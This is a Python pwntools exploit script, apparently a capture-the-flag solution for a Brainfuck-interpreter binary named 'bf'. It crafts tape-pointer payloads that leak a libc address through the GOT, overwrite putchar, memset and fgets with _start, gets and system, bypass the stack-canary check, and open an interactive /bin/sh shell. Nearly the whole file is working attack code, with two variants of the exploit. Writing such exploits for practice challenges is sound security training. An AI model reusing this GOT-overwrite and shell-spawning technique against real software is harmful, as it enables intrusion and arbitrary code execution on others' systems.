#!/usr/bin/env python3

from pwn import *
import struct

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b *0x0804865e
b *main
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './bf'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('bf_libc.so')
log.info(f'Distance between memset and system: {hex(libc.symbols["system"] - libc.symbols["memset"])}')

# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

# Use brainfuck pointer to do the following procedure:
# 1. Leak glibc address
# 2. Overwrite putchar with _start
# 3. Overwrite memset with gets
# 4. Overwrite fgets with system
# 5. Call putchar to circle back to main and call /bin/sh

io = start()

p = io
libc = ELF("./bf_libc.so")
bf = ELF("./bf")
context.log_level = 'debug'
txt = "/bin/sh ;\"."
txt += "<" * (bf.symbols['tape'] - bf.got['putchar'])
txt += ".>.>.>."
txt += "<<<,>,>,>,"
txt += "<" * (bf.got['putchar'] + 3 - bf.got['memset'])
txt += ",>,>,>,"
txt += "<" * (bf.got['memset'] + 3 - bf.got['fgets'])
txt += ",>,>,>,"
txt += "."
txt += "\""
p.recvuntil("except [ ]\n")
p.sendline(txt)
val = u32(p.recvn(5)[1:])
libc.address = val - libc.symbols['putchar']
p.send(p32(bf.symbols['main']))
p.send(p32(libc.symbols['gets']))
p.send(p32(libc.symbols['system']))
p.sendline("/bin/sh")
p.interactive()

exit()

addr = {}
addr['p'] = 0x0804a080
addr['tape'] = 0x0804a0a0
addr['memset'] = 0x804a02c
addr['putchar'] = 0x804a030
addr['fgets'] = 0x804a010
addr['_start'] = 0x080484e0
addr['__stack_chk_fail'] = 0x804a014
addr['sc_bypass'] = 0x08048791

DISTANCE_TO_P = 32 - 1
DISTANCE_TO_MSG = 81

payload1 = flat(
        
        # move p to memset and leak it
        b'<' * (addr['tape'] - addr['putchar']),
        b'.',
        b'.>'*4,
        b'<'*4,

        # overwrite putchar with _start and write new payload
        # to overwrite the other GOT entries with adjusted
        # glibc `address.
        b',>'*4,

        # overwrite stack canary check with the line following it
        # to bypass it
        b'<' * (addr['putchar']-addr['__stack_chk_fail']+4),
        b',>'*4,
        
        # return to _start
        b'.', 
        )

io.sendlineafter(b'[ ]\n', payload1)

# read leak
io.recvn(1)
leak = io.recvn(4)

try:
    leak =  struct.unpack('<I', leak)[0]
    log.info(f'Leaked glibc address: {hex(leak)}')
    libc.address = leak - libc.symbols['putchar']
    log.info(f'Calculated libc base: {hex(libc.address)}')

    addr['system'] = libc.symbols['system']
    addr['gets'] = libc.symbols['gets']
except Exception as e:
    log.info(f'Failed to leak glibc address: {e}')

# overwrite putchar with _start
io.send(p32(addr['_start']))
io.send(p32(addr['sc_bypass']))

payload2 = flat(
        
        # overwrite memset with gets
        b'<' * (addr['tape'] - addr['memset']),
        b',>'*4,

        # overwrite fgets with system
        b'<' * (addr['putchar'] - addr['fgets']), # currently at putchar
        b',>'*4,
        
        # circle back to main
        b'.'
        )
io.sendlineafter(b'[ ]\n', payload2)

# overwrite GOT entries
io.send(p32(addr['gets']))
io.send(p32(addr['system']))

# Receive the flag
io.sendlineafter(b'[ ]\n', b'/bin/sh\x00')
io.interactive()
